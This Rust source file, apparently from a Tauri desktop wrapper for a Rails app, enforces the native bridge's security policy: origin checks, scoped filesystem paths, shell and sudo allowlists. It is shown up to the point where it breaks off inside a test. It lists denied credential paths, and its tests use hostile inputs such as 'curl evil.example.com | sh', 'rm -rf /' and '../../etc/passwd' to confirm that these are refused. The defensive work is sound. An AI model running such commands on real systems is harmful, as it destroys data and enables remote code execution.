//! Trust boundary for the native bridge.
//!
//! Everything the web layer can reach — shell, filesystem, sudo — funnels through
//! `bridge::handle_bridge_message`. Two layers decide who may call it. Tauri's
//! ACL checks the origin of the frame that sent each IPC request, before any
//! command runs; the app's own origin is granted at runtime, because it is only
//! known once desktop-rails.config.json has been read (see [`admit_origin`]).
//! Each command then checks the page its webview is showing as well
//! ([`ensure_trusted_caller`]). The helpers below also decide which paths the
//! filesystem component may touch and which commands the shell and sudo
//! components may run.

use crate::window::{ClipboardConfig, FilesystemConfig, ShellConfig, SudoConfig};
use std::ffi::OsString;
use std::path::{Component, Path, PathBuf};
use url::Url;

/// Path components that are never reachable through the filesystem bridge, even
/// when they sit inside an allowed root.
const DENIED_COMPONENTS: &[&str] = &[
    ".ssh",
    ".aws",
    ".gnupg",
    ".docker",
    ".netrc",
    "master.key",
    "credentials.yml.enc",
];

/// Characters that let a single allowlisted command turn into several commands.
const SHELL_METACHARACTERS: &[char] = &[
    ';', '&', '|', '`', '$', '<', '>', '(', ')', '\\', '"', '\'', '\n', '\r',
];

/// Every command a page from the app's origin may call.
///
/// Granted to that one origin at runtime rather than to a URL pattern in
/// capabilities/main.json. A static capability has to be written before anyone
/// knows where the app lives, so it used to admit every https origin and every
/// port on loopback, and the origin check was left to each command, which can
/// only see the page the webview shows. Tauri's ACL sees the frame that actually
/// sent the request, so an embedded frame or a page that has just navigated
/// away cannot borrow the app's standing.
///
/// Plugin commands (dialogs, notifications, the updater's JS API, opening URLs)
/// are deliberately absent: nothing a remote page runs calls them directly, and
/// the bridge reaches the same features under the policy in the config.
pub const APP_ORIGIN_PERMISSIONS: &[&str] = &[
    "allow-handle-visit-proposal",
    "allow-update-window-title",
    "allow-page-loaded",
    "allow-page-loading",
    "allow-close-modal",
    "allow-dismiss-modal",
    "allow-handle-bridge-message",
    "allow-send-bridge-response",
    "allow-retry-connection",
    "allow-get-window-info",
];

/// Window labels the app's own pages are shown in.
pub const APP_WINDOWS: &[&str] = &["main", "modal-*", "window-*"];

/// The ACL pattern that admits exactly the origin of `server_url`: its scheme,
/// its host and its port, any path.
///
/// `None` for anything that is not an http(s) URL with a host, which grants
/// nothing rather than something broader.
pub fn origin_pattern(server_url: &str) -> Option<String> {
    let url = Url::parse(server_url).ok()?;
    if !matches!(url.scheme(), "http" | "https") {
        return None;
    }
    let host = url.host_str().filter(|h| !h.is_empty())?;
    // Url drops a port that is the scheme's default, which is also how the
    // pattern has to spell it: the page's own URL never carries an explicit
    // :443 either.
    let port = url.port().map(|p| format!(":{p}")).unwrap_or_default();
    Some(format!("{}://{}{}/*", url.scheme(), host, port))
}

/// The runtime capability for one app origin.
pub fn app_origin_capability(server_url: &str) -> Option<tauri::ipc::CapabilityBuilder> {
    let pattern = origin_pattern(server_url)?;
    let capability = APP_ORIGIN_PERMISSIONS.iter().fold(
        tauri::ipc::CapabilityBuilder::new(format!("app-origin {pattern}"))
            .remote(pattern)
            .local(false)
            .windows(APP_WINDOWS.iter().copied()),
        |capability, permission| capability.permission(*permission),
    );
    Some(capability)
}

/// Origins already granted, so an address announced again after a restart does
/// not stack up identical capabilities.
#[derive(Default)]
pub struct AdmittedOrigins(std::sync::Mutex<Vec<String>>);

/// Let pages from the origin of `server_url` call the app's commands.
///
/// Called once for the configured `server_url`, and again for the address a
/// bundled app's server announces, since that is only known once it is up.
pub fn admit_origin<R: tauri::Runtime, M: tauri::Manager<R>>(
    manager: &M,
    server_url: &str,
) -> Result<(), String> {
    let Some(pattern) = origin_pattern(server_url) else {
        return Err(format!(
            "'{}' is not an http or https URL, so no page may use the bridge",
            server_url
        ));
    };

    if let Some(admitted) = manager.try_state::<AdmittedOrigins>() {
        let mut admitted = admitted
            .0
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        if admitted.contains(&pattern) {
            return Ok(());
        }
        admitted.push(pattern.clone());
    }

    let capability = app_origin_capability(server_url)
        .ok_or_else(|| format!("No capability could be built for '{}'", server_url))?;
    manager
        .add_capability(capability)
        .map_err(|e| format!("Could not trust {}: {}", pattern, e))?;
    log::info!("Bridge: pages from {} may call the app's commands", pattern);
    Ok(())
}

/// True when `candidate` shares scheme, host and port with the configured server.
///
/// The webview loads a remote app, so the page origin — not the window label — is
/// what identifies trusted callers.
pub fn is_trusted_origin(server_url: &str, candidate: &Url) -> bool {
    let Ok(server) = Url::parse(server_url) else {
        return false;
    };

    candidate.scheme() == server.scheme()
        && candidate.host_str() == server.host_str()
        && candidate.port_or_known_default() == server.port_or_known_default()
}

/// True for pages we ship inside the bundle, such as the offline waiting page.
///
/// These are our own static assets rather than anything fetched over the
/// network, so they are trusted alongside the app origin. Tauri serves them
/// from `tauri://localhost`, or `http://tauri.localhost` on Windows.
pub fn is_bundled_app_origin(candidate: &Url) -> bool {
    match candidate.scheme() {
        "tauri" => true,
        "http" | "https" => candidate.host_str() == Some("tauri.localhost"),
        _ => false,
    }
}

/// Reject a command call coming from any page that is not the app origin.
///
/// Every app-defined command that can act on the host asks for this itself.
/// It is the second layer. The ACL has already refused a request whose own
/// frame is not the app origin; this refuses one whose webview is no longer
/// showing the app, such as a request that was still on its way when the page
/// navigated somewhere else.
pub fn ensure_trusted_caller<R: tauri::Runtime>(
    app: &tauri::AppHandle<R>,
    webview: &tauri::Webview<R>,
) -> Result<(), String> {
    use tauri::Manager;

    let config = app.state::<crate::window::DesktopRailsConfig>();
    let url = webview
        .url()
        .map_err(|e| format!("Could not determine the calling page: {}", e))?;

    // The address the app's own server announced counts as the app origin too,
    // or a bundled app could not call a single native capability: its config
    // carries a placeholder port, so nothing the window loads would match it.
    let announced = crate::server::ServerAddress::announced(app);
    if is_trusted_origin(&config.server_url, &url)
        || is_bundled_app_origin(&url)
        || announced
            .as_deref()
            .is_some_and(|address| is_trusted_origin(address, &url))
    {
        return Ok(());
    }

    log::warn!(
        "Refused a call from untrusted origin '{}' (expected '{}')",
        url.origin().ascii_serialization(),
        config.server_url
    );
    Err("Refused: this command is only available to the configured app origin".to_string())
}

/// Where a link should open.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LinkDestination {
    /// Load it in the app window.
    App,
    /// Hand it to the browser, mail client, or whatever else owns the scheme.
    SystemBrowser,
}

/// Decide where a URL belongs.
///
/// The app's own origin loads in the window, as do bundled pages and any host
/// the app has explicitly listed. Everything else is someone else's site and
/// goes to the browser, which is how Hotwire Native treats off-origin links —
/// without it, following a link to a payment provider or a terms page replaces
/// your app in its own window and strands the person there.
///
/// Non-web schemes — `mailto:`, `tel:` and the like — always leave.
pub fn destination_for(server_url: &str, internal_hosts: &[String], url: &Url) -> LinkDestination {
    destination_for_discovered(server_url, None, internal_hosts, url)
}

/// The same decision, for an app whose server announced its own address.
///
/// A bundled app cannot know its port when its config is written — the server
/// binds 127.0.0.1:0 and reports where it landed — so `server_url` is a
/// placeholder until the handshake arrives. Without consulting the address the
/// server actually announced, the app's own pages read as someone else's site
/// and get handed to the browser.
pub fn destination_for_discovered(
    server_url: &str,
    discovered: Option<&str>,
    internal_hosts: &[String],
    url: &Url,
) -> LinkDestination {
    if discovered.is_some_and(|address| is_trusted_origin(address, url)) {
        return LinkDestination::App;
    }

    if is_trusted_origin(server_url, url) || is_bundled_app_origin(url) {
        return LinkDestination::App;
    }

    if !matches!(url.scheme(), "http" | "https") {
        return LinkDestination::SystemBrowser;
    }

    let Some(host) = url.host_str() else {
        return LinkDestination::SystemBrowser;
    };

    // Exact host matches only. A suffix match would let evil-example.com
    // through on the strength of example.com.
    if internal_hosts
        .iter()
        .any(|allowed| allowed.trim().eq_ignore_ascii_case(host))
    {
        return LinkDestination::App;
    }

    LinkDestination::SystemBrowser
}

/// Home directory, honouring the Windows variable as well as `HOME`.
fn home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from)
        .filter(|p| !p.as_os_str().is_empty())
}

/// Expand a leading `~` to the user's home directory.
pub fn expand_tilde(path: &str) -> Option<PathBuf> {
    if path == "~" {
        home_dir()
    } else if let Some(rest) = path.strip_prefix("~/") {
        home_dir().map(|home| home.join(rest))
    } else {
        Some(PathBuf::from(path))
    }
}

/// Resolve `.` and `..` without touching the filesystem.
fn lexical_normalize(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for component in path.components() {
        match component {
            Component::CurDir => {}
            Component::ParentDir => {
                out.pop();
            }
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// Canonicalize the deepest ancestor that exists, then re-append the rest.
///
/// Plain `canonicalize` fails for paths that do not exist yet, which is the
/// normal case for `write` and `mkdir`. Resolving the existing prefix still
/// defeats symlinks that would otherwise escape an allowed root.
fn canonicalize_existing_prefix(path: &Path) -> PathBuf {
    let mut tail: Vec<OsString> = Vec::new();
    let mut current = path.to_path_buf();

    loop {
        if let Ok(real) = current.canonicalize() {
            let mut out = real;
            for part in tail.iter().rev() {
                out.push(part);
            }
            return out;
        }

        let Some(name) = current.file_name().map(|n| n.to_os_string()) else {
            return lexical_normalize(path);
        };
        let Some(parent) = current.parent().map(|p| p.to_path_buf()) else {
            return lexical_normalize(path);
        };

        tail.push(name);
        current = parent;
    }
}

fn is_denied(path: &Path) -> bool {
    path.components().any(|component| {
        component
            .as_os_str()
            .to_str()
            .is_some_and(|name| DENIED_COMPONENTS.contains(&name))
    })
}

/// Resolve a bridge-supplied path and confirm it stays inside an allowed root.
///
/// Returns the resolved absolute path, or an error describing why it was refused.
pub fn resolve_in_scope(raw: &str, roots: &[PathBuf]) -> Result<PathBuf, String> {
    if raw.trim().is_empty() {
        return Err("Filesystem path is empty".to_string());
    }
    if roots.is_empty() {
        return Err("Filesystem bridge has no allowed roots configured".to_string());
    }

    let expanded = expand_tilde(raw)
        .ok_or_else(|| "Could not expand '~': no home directory found".to_string())?;
    if !expanded.is_absolute() {
        return Err(format!(
            "Filesystem path must be absolute or start with '~': {}",
            raw
        ));
    }

    let resolved = canonicalize_existing_prefix(&lexical_normalize(&expanded));

    if is_denied(&resolved) {
        return Err(format!("Refused: '{}' touches a protected location", raw));
    }

    let allowed = roots.iter().any(|root| {
        let root = canonicalize_existing_prefix(&lexical_normalize(root));
        resolved == root || resolved.starts_with(&root)
    });

    if allowed {
        Ok(resolved)
    } else {
        Err(format!(
            "Refused: '{}' is outside the allowed filesystem roots",
            raw
        ))
    }
}

/// Names the app's own data directory in `allowed_roots`.
pub const APP_DATA_TOKEN: &str = "$APP_DATA";

/// Allowed filesystem roots for the current configuration.
///
/// An empty `allowed_roots` means no roots: the bridge reaches only what the
/// user grants through a dialog or a drop. It used to mean the app data
/// directory, which on Linux is also where the webview keeps its cookies and
/// local storage, so any script on the app origin could read the session
/// store. An app that wants that directory asks for it with `$APP_DATA`.
pub fn allowed_roots(app_data_dir: Option<PathBuf>, config: &FilesystemConfig) -> Vec<PathBuf> {
    config
        .allowed_roots
        .iter()
        .filter_map(|root| {
            let root = root.trim();
            if root == APP_DATA_TOKEN {
                return app_data_dir.clone();
            }
            if let Some(rest) = root.strip_prefix(&format!("{APP_DATA_TOKEN}/")) {
                return app_data_dir.as_ref().map(|dir| dir.join(rest));
            }
            expand_tilde(root)
        })
        .filter(|root| root.is_absolute())
        .collect()
}

/// Paths the user has handed to the app through a native dialog this session.
///
/// A file the user picks in an open/save dialog is explicit consent for that
/// path, so it does not also need to be inside `allowed_roots` — requiring
/// that would force apps to allowlist the whole home directory to make
/// "Save As…" work. Picking a file grants that one path; picking a folder
/// grants its subtree. Grants live in memory only, so consent ends with the
/// session.
#[derive(Default)]
pub struct UserGrants(std::sync::Mutex<Vec<Grant>>);

struct Grant {
    path: PathBuf,
    subtree: bool,
}

impl UserGrants {
    /// Record a file the user picked in a dialog.
    pub fn grant_file(&self, path: &str) {
        self.push(path, false);
    }

    /// Record a folder the user picked in a dialog, covering everything in it.
    pub fn grant_folder(&self, path: &str) {
        self.push(path, true);
    }

    fn push(&self, path: &str, subtree: bool) {
        let normalized = canonicalize_existing_prefix(&lexical_normalize(Path::new(path)));
        self.0
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .push(Grant {
                path: normalized,
                subtree,
            });
    }

    fn allows(&self, resolved: &Path) -> bool {
        self.0
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .iter()
            .any(|grant| {
                resolved == grant.path || (grant.subtree && resolved.starts_with(&grant.path))
            })
    }
}

/// Like [`resolve_in_scope`], but a path the user granted through a dialog is
/// also allowed. The protected-location denials still apply — a grant widens
/// where the app may go, never past what is denied outright.
pub fn resolve_with_grants(
    raw: &str,
    roots: &[PathBuf],
    grants: &UserGrants,
) -> Result<PathBuf, String> {
    let refused = match resolve_in_scope(raw, roots) {
        Ok(path) => return Ok(path),
        Err(e) => e,
    };

    let expanded = expand_tilde(raw).filter(|p| p.is_absolute());
    let Some(expanded) = expanded else {
        return Err(refused);
    };

    let resolved = canonicalize_existing_prefix(&lexical_normalize(&expanded));
    if !is_denied(&resolved) && grants.allows(&resolved) {
        Ok(resolved)
    } else {
        Err(refused)
    }
}

/// Decide whether a command may run with administrator privileges.
///
/// Sudo is off unless the app turns it on and names the commands it needs.
/// Metacharacters are refused outright so an allowlisted prefix cannot be
/// extended into a second command.
pub fn authorize_sudo_command(config: &SudoConfig, command: &str) -> Result<(), String> {
    let command = command_gate("sudo", config.enabled, &config.allowed_commands, command)?;
    allowlisted("sudo", &config.allowed_commands, command)
}

/// The checks the sudo and shell allowlists share, before any matching: the
/// component is on, the command is not empty, it cannot be split into a second
/// command, and there is an allowlist to match against at all.
fn command_gate<'a>(
    component: &str,
    enabled: bool,
    allowed_commands: &[String],
    command: &'a str,
) -> Result<&'a str, String> {
    if !enabled {
        return Err(format!(
            "The {component} bridge is disabled. Enable it in desktop-rails.config.json with \
             \"{component}\": {{ \"enabled\": true, \"allowed_commands\": [...] }}"
        ));
    }

    let command = command.trim();
    if command.is_empty() {
        return Err(format!("The {component} command is empty"));
    }

    if let Some(found) = command.chars().find(|c| SHELL_METACHARACTERS.contains(c)) {
        return Err(format!(
            "Refused: {component} command contains the shell metacharacter '{found}'"
        ));
    }

    if allowed_commands.is_empty() {
        return Err(format!(
            "Refused: no allowed_commands are configured for the {component} bridge"
        ));
    }

    Ok(command)
}

/// Whether an allowlist entry covers `line`, whole or up to a word boundary.
fn allowlisted(component: &str, allowed_commands: &[String], line: &str) -> Result<(), String> {
    let allowed = allowed_commands.iter().any(|entry| {
        let entry = entry.trim();
        !entry.is_empty() && (line == entry || line.starts_with(&format!("{} ", entry)))
    });

    if allowed {
        Ok(())
    } else {
        Err(format!("Refused: '{line}' is not in the {component} allowlist"))
    }
}

/// Decide whether a page may run `command` with `args` as the user.
///
/// The command is held to the same rules as sudo: no metacharacters, and the
/// command line must be covered by an allowlist entry. Arguments are quoted one
/// by one before they reach the shell, so on Unix they may hold anything. `cmd`
/// has no quoting that survives a double quote or a `%`, so on Windows an
/// argument carrying one is refused instead.
pub fn authorize_shell_command(
    config: &ShellConfig,
    command: &str,
    args: &[String],
) -> Result<(), String> {
    authorize_shell_command_for(config, command, args, cfg!(windows))
}

fn authorize_shell_command_for(
    config: &ShellConfig,
    command: &str,
    args: &[String],
    through_cmd: bool,
) -> Result<(), String> {
    let command = command_gate("shell", config.enabled, &config.allowed_commands, command)?;

    if through_cmd {
        if let Some(arg) = args.iter().find(|arg| unsafe_for_cmd(arg)) {
            return Err(format!(
                "Refused: the argument '{arg}' cannot be passed through cmd safely"
            ));
        }
    }

    let line = std::iter::once(command)
        .chain(args.iter().map(String::as_str))
        .collect::<Vec<_>>()
        .join(" ");
    allowlisted("shell", &config.allowed_commands, &line)
}

/// Whether `cmd /C` could be talked out of its quoting by this argument.
fn unsafe_for_cmd(arg: &str) -> bool {
    arg.chars()
        .any(|c| matches!(c, '"' | '%' | '!' | '^' | '\n' | '\r'))
}

/// Decide whether a page may set these environment variables for a command.
///
/// Only names the app listed. Anything else could change which program an
/// allowlisted command really runs: `PATH` picks the binary, `BASH_ENV` and
/// `ENV` run a script first, `LD_PRELOAD` and `DYLD_INSERT_LIBRARIES` load code
/// into it.
pub fn authorize_shell_env<'a>(
    config: &ShellConfig,
    names: impl IntoIterator<Item = &'a str>,
) -> Result<(), String> {
    for name in names {
        let listed = config
            .allowed_env
            .iter()
            .any(|allowed| allowed.trim().eq_ignore_ascii_case(name));
        if !listed {
            return Err(format!(
                "Refused: the environment variable '{name}' is not in shell.allowed_env"
            ));
        }
    }
    Ok(())
}

/// Decide whether a page may read the system clipboard.
pub fn authorize_clipboard_read(config: &ClipboardConfig) -> Result<(), String> {
    if config.read {
        Ok(())
    } else {
        Err(
            "Refused: reading the clipboard is off. Enable it in desktop-rails.config.json \
             with \"clipboard\": { \"read\": true }"
                .to_string(),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn url(s: &str) -> Url {
        Url::parse(s).expect("test url should parse")
    }

    #[test]
    fn trusts_the_configured_origin() {
        assert!(is_trusted_origin(
            "https://app.example.com",
            &url("https://app.example.com/dashboard?q=1")
        ));
        assert!(is_trusted_origin(
            "http://localhost:3000",
            &url("http://localhost:3000/users/1")
        ));
    }

    #[test]
    fn rejects_other_origins() {
        assert!(!is_trusted_origin(
            "https://app.example.com",
            &url("https://evil.example.com/")
        ));
        // Different port.
        assert!(!is_trusted_origin(
            "http://localhost:3000",
            &url("http://localhost:4000/")
        ));
        // Downgraded scheme.
        assert!(!is_trusted_origin(
            "https://app.example.com",
            &url("http://app.example.com/")
        ));
        // Suffix match must not pass.
        assert!(!is_trusted_origin(
            "https://example.com",
            &url("https://notexample.com/")
        ));
    }

    /// A packaged app's config can only carry a placeholder port, so its own
    /// pages used to look like someone else's site: the window refused to load
    /// them and the app opened in the system browser instead.
    #[test]
    fn the_address_the_server_announced_is_the_app() {
        assert_eq!(
            destination_for_discovered(
                "http://127.0.0.1:0",
                Some("http://127.0.0.1:61234"),
                &[],
                &url("http://127.0.0.1:61234/orders/1")
            ),
            LinkDestination::App
        );
    }

    #[test]
    fn a_different_port_on_this_machine_is_still_someone_else() {
        // Loopback is not a licence: the port is part of the origin, and some
        // other server on it is no more ours than a remote site is.
        assert_eq!(
            destination_for_discovered(
                "http://127.0.0.1:0",
                Some("http://127.0.0.1:61234"),
                &[],
                &url("http://127.0.0.1:61235/")
            ),
            LinkDestination::SystemBrowser
        );
    }

    #[test]
    fn nothing_announced_leaves_the_decision_as_it_was() {
        assert_eq!(
            destination_for_discovered(
                "https://app.example.com",
                None,
                &[],
                &url("https://app.example.com/orders/1")
            ),
            LinkDestination::App
        );
        assert_eq!(
            destination_for_discovered(
                "https://app.example.com",
                None,
                &[],
                &url("https://news.example.org/article")
            ),
            LinkDestination::SystemBrowser
        );
    }

    #[test]
    fn bundled_pages_are_trusted() {
        assert!(is_bundled_app_origin(&url("tauri://localhost/index.html")));
        assert!(is_bundled_app_origin(&url("http://tauri.localhost/index.html")));
    }

    #[test]
    fn remote_pages_are_not_bundled_pages() {
        assert!(!is_bundled_app_origin(&url("https://evil.example.com/")));
        assert!(!is_bundled_app_origin(&url("http://localhost:3000/")));
        // A host that merely ends with the bundled host must not pass.
        assert!(!is_bundled_app_origin(&url("https://evil.tauri.localhost.example.com/")));
    }

    fn destination(url_str: &str, internal: &[&str]) -> LinkDestination {
        let hosts: Vec<String> = internal.iter().map(|h| h.to_string()).collect();
        destination_for("https://app.example.com", &hosts, &url(url_str))
    }

    #[test]
    fn the_app_loads_in_the_app_window() {
        assert_eq!(
            destination("https://app.example.com/orders/1", &[]),
            LinkDestination::App
        );
        assert_eq!(
            destination("tauri://localhost/error.html", &[]),
            LinkDestination::App
        );
    }

    #[test]
    fn someone_elses_site_goes_to_the_browser() {
        assert_eq!(
            destination("https://news.example.org/article", &[]),
            LinkDestination::SystemBrowser
        );
    }

    #[test]
    fn a_listed_host_may_load_in_the_app() {
        let oauth = "https://accounts.google.com/o/oauth2/auth";

        assert_eq!(
            destination(oauth, &[]),
            LinkDestination::SystemBrowser,
            "an identity provider is off-origin like anything else until it is listed"
        );
        assert_eq!(
            destination(oauth, &["accounts.google.com"]),
            LinkDestination::App,
            "listing it keeps the OAuth round trip in this webview, where the cookie belongs"
        );
    }

    #[test]
    fn listed_hosts_match_exactly() {
        let hosts = vec!["example.com".to_string()];

        // A host that merely ends with an allowed one must not pass.
        assert_eq!(
            destination_for(
                "https://app.example.com",
                &hosts,
                &url("https://evil-example.com/")
            ),
            LinkDestination::SystemBrowser
        );
        assert_eq!(
            destination_for(
                "https://app.example.com",
                &hosts,
                &url("https://sub.example.com/")
            ),
            LinkDestination::SystemBrowser,
            "a subdomain is a different host"
        );
        // Case should not matter.
        assert_eq!(
            destination_for("https://app.example.com", &hosts, &url("https://EXAMPLE.com/")),
            LinkDestination::App
        );
    }

    #[test]
    fn non_web_schemes_always_leave() {
        for link in ["mailto:hi@example.com", "tel:+15551234", "sms:+15551234"] {
            assert_eq!(
                destination(link, &[]),
                LinkDestination::SystemBrowser,
                "{link} should be handed to the system"
            );
        }
    }

    #[test]
    fn implicit_and_explicit_ports_match() {
        assert!(is_trusted_origin(
            "https://app.example.com",
            &url("https://app.example.com:443/")
        ));
    }

    #[test]
    fn resolves_paths_inside_an_allowed_root() {
        let dir = std::env::temp_dir().join("desktop-rails-scope-ok");
        std::fs::create_dir_all(&dir).unwrap();
        let root = dir.canonicalize().unwrap();

        let resolved = resolve_in_scope(&root.join("notes.txt").to_string_lossy(), &[root.clone()])
            .expect("path inside the root should resolve");
        assert!(resolved.starts_with(&root));

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn rejects_traversal_out_of_the_root() {
        let dir = std::env::temp_dir().join("desktop-rails-scope-traversal");
        std::fs::create_dir_all(&dir).unwrap();
        let root = dir.canonicalize().unwrap();

        let escape = root.join("../../etc/passwd");
        let err = resolve_in_scope(&escape.to_string_lossy(), &[root.clone()])
            .expect_err("traversal should be refused");
        assert!(err.contains("outside the allowed"), "unexpected error: {err}");

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn rejects_protected_locations_inside_a_root() {
        let dir = std::env::temp_dir().join("desktop-rails-scope-denied");
        std::fs::create_dir_all(&dir).unwrap();
        let root = dir.canonicalize().unwrap();

        let secret = root.join(".ssh").join("id_rsa");
        let err = resolve_in_scope(&secret.to_string_lossy(), &[root.clone()])
            .expect_err("protected component should be refused");
        assert!(err.contains("protected"), "unexpected error: {err}");

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn rejects_relative_paths() {
        let root = std::env::temp_dir();
        let err = resolve_in_scope("notes.txt", &[root])
            .expect_err("relative paths should be refused");
        assert!(err.contains("absolute"), "unexpected error: {err}");
    }

    #[test]
    fn rejects_every_path_when_no_roots_are_allowed() {
        let err = resolve_in_scope("/tmp/anything", &[])
            .expect_err("an empty root list should refuse everything");
        assert!(err.contains("no allowed roots"), "unexpected error: {err}");
    }

    #[test]
    fn a_dialog_picked_file_is_reachable_outside_the_roots() {
        let dir = std::env::temp_dir().join("desktop-rails-grant-file");
        std::fs::create_dir_all(&dir).unwrap();
        let picked = dir.canonicalize().unwrap().join("report.csv");

        let grants = UserGrants::default();
        let roots = [PathBuf::from("/nonexistent-root")];

        let raw = picked.to_string_lossy().to_string();
        assert!(resolve_with_grants(&raw, &roots, &grants).is_err());

        grants.grant_file(&raw);
        let resolved =
            resolve_with_grants(&raw, &roots, &grants).expect("a picked file should be reachable");
        assert_eq!(resolved, picked);

        // The grant covers that one file, not its siblings.
        let sibling = dir.join("other.csv").to_string_lossy().to_string();
        assert!(resolve_with_grants(&sibling, &roots, &grants).is_err());

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn a_dialog_picked_folder_covers_its_subtree() {
        let dir = std::env::temp_dir().join("desktop-rails-grant-folder");
        std::fs::create_dir_all(&dir).unwrap();
        let folder = dir.canonicalize().unwrap();

        let grants = UserGrants::default();
        grants.grant_folder(&folder.to_string_lossy());

        let inside = folder.join("nested").join("file.txt");
        let resolved = resolve_with_grants(&inside.to_string_lossy(), &[], &grants)
            .expect("a path inside the picked folder should be reachable");
        assert_eq!(resolved, inside);

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn a_grant_does_not_override_protected_locations() {
        let dir = std::env::temp_dir().join("desktop-rails-grant-denied");
        std::fs::create_dir_all(&dir).unwrap();
        let folder = dir.canonicalize().unwrap();

        let grants = UserGrants::default();
        grants.grant_folder(&folder.to_string_lossy());

        let secret = folder.join(".ssh").join("id_rsa");
        assert!(resolve_with_grants(&secret.to_string_lossy(), &[], &grants).is_err());

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn a_grant_cannot_be_reached_by_traversal_from_a_root() {
        // A granted path must match after normalization, so `root/../granted`
        // resolves to the grant itself and is allowed, while unrelated
        // traversal keeps failing.
        let dir = std::env::temp_dir().join("desktop-rails-grant-traversal");
        std::fs::create_dir_all(&dir).unwrap();
        let picked = dir.canonicalize().unwrap().join("picked.txt");

        let grants = UserGrants::default();
        grants.grant_file(&picked.to_string_lossy());

        let dodged = dir.join("sub").join("..").join("picked.txt");
        let resolved = resolve_with_grants(&dodged.to_string_lossy(), &[], &grants)
            .expect("normalized path should match the grant");
        assert_eq!(resolved, picked);

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn filesystem_has_no_roots_unless_the_config_names_some() {
        // It used to default to the app data directory, which on Linux is also
        // where the webview keeps the app's cookies and local storage.
        let app_data = PathBuf::from("/tmp/app-data");
        let roots = allowed_roots(Some(app_data.clone()), &FilesystemConfig::default());
        assert!(roots.is_empty(), "no configured roots must mean none: {roots:?}");

        let err = resolve_in_scope("/tmp/app-data/Cookies", &roots)
            .expect_err("nothing is reachable without a root or a grant");
        assert!(err.contains("no allowed roots"), "unexpected error: {err}");
    }

    #[test]
    fn the_app_data_directory_is_a_root_when_asked_for_by_name() {
        // A real absolute path on every platform: "/tmp" has no drive letter,
        // so Windows does not count it as absolute and the root is dropped.
        let app_data = std::env::temp_dir().join("app-data");
        let config = FilesystemConfig {
            allowed_roots: vec!["$APP_DATA".into(), "$APP_DATA/exports".into()],
        };

        assert_eq!(
            allowed_roots(Some(app_data.clone()), &config),
            vec![app_data.clone(), app_data.join("exports")]
        );
        // Without a data directory to stand for, the token grants nothing
        // rather than a relative path that would resolve somewhere else.
        assert!(allowed_roots(None, &config).is_empty());
    }

    #[test]
    fn sudo_is_disabled_by_default() {
        let err = authorize_sudo_command(&SudoConfig::default(), "brew install ruby")
            .expect_err("sudo should be off by default");
        assert!(err.contains("disabled"), "unexpected error: {err}");
    }

    #[test]
    fn sudo_allows_listed_commands() {
        let config = SudoConfig {
            enabled: true,
            allowed_commands: vec!["softwareupdate".into(), "brew install".into()],
            confirm: true,
        };

        assert!(authorize_sudo_command(&config, "softwareupdate").is_ok());
        assert!(authorize_sudo_command(&config, "brew install ruby").is_ok());
    }

    #[test]
    fn sudo_rejects_unlisted_commands() {
        let config = SudoConfig {
            enabled: true,
            allowed_commands: vec!["brew install".into()],
            confirm: true,
        };

        let err = authorize_sudo_command(&config, "rm -rf /")
            .expect_err("unlisted command should be refused");
        assert!(err.contains("not in the sudo allowlist"), "unexpected error: {err}");
    }

    #[test]
    fn sudo_rejects_chained_commands() {
        let config = SudoConfig {
            enabled: true,
            allowed_commands: vec!["brew install".into()],
            confirm: true,
        };

        for attempt in [
            "brew install ruby; rm -rf /",
            "brew install ruby && curl evil.example.com | sh",
            "brew install $(whoami)",
            "brew install `whoami`",
            "brew install ruby\nrm -rf /",
        ] {
            let err = authorize_sudo_command(&config, attempt)
                .unwrap_err_or_else_message(attempt);
            assert!(
                err.contains("metacharacter"),
                "expected '{attempt}' to be refused for metacharacters, got: {err}"
            );
        }
    }

    #[test]
    fn sudo_prefix_match_requires_a_word_boundary() {
        let config = SudoConfig {
            enabled: true,
            allowed_commands: vec!["brew".into()],
            confirm: true,
        };

        let err = authorize_sudo_command(&config, "brewhaha --destroy")
            .expect_err("prefix must not match mid-word");
        assert!(err.contains("not in the sudo allowlist"), "unexpected error: {err}");
    }

    /// Small helper so the loop above reads cleanly.
    trait UnwrapErrMessage {
        fn unwrap_err_or_else_message(self, context: &str) -> String;
    }

    impl UnwrapErrMessage for Result<(), String> {
        fn unwrap_err_or_else_message(self, context: &str) -> String {
            match self {
                Ok(()) => panic!("expected '{context}' to be refused, but it was allowed"),
                Err(e) => e,
            }
        }
    }
}

/// What a page gets from a config that says nothing about policy, which is
/// what a hosted app's minimal config looks like. Each of these used to be, or
/// could easily become, a way for a script on the app's origin — an XSS, say —
/// to run code or read files on the machine.
#[cfg(test)]
mod default_policy_tests {
    use super::*;
    use crate::window::{parse_config, DesktopRailsConfig};

    fn minimal() -> DesktopRailsConfig {
        parse_config(r#"{"server_url":"https://app.example.com"}"#).expect("a minimal config")
    }

    #[test]
    fn the_shell_is_off() {
        let config = minimal();
        assert!(!config.shell.enabled);

        let err = authorize_shell_command(&config.shell, "echo", &["hi".into()])
            .expect_err("a config that does not enable the shell must not run commands");
        assert!(err.contains("shell bridge is disabled"), "unexpected error: {err}");
    }

    #[test]
    fn sudo_is_off() {
        let err = authorize_sudo_command(&minimal().sudo, "softwareupdate -l")
            .expect_err("a config that does not enable sudo must not elevate");
        assert!(err.contains("disabled"), "unexpected error: {err}");
    }

    #[test]
    fn the_filesystem_reaches_nothing_the_user_did_not_grant() {
        let config = minimal();
        let data_dir = std::env::temp_dir().join("desktop-rails-default-policy");
        let roots = allowed_roots(Some(data_dir.clone()), &config.filesystem);

        for path in [
            data_dir.join("Cookies").to_string_lossy().to_string(),
            "~/Documents/notes.txt".to_string(),
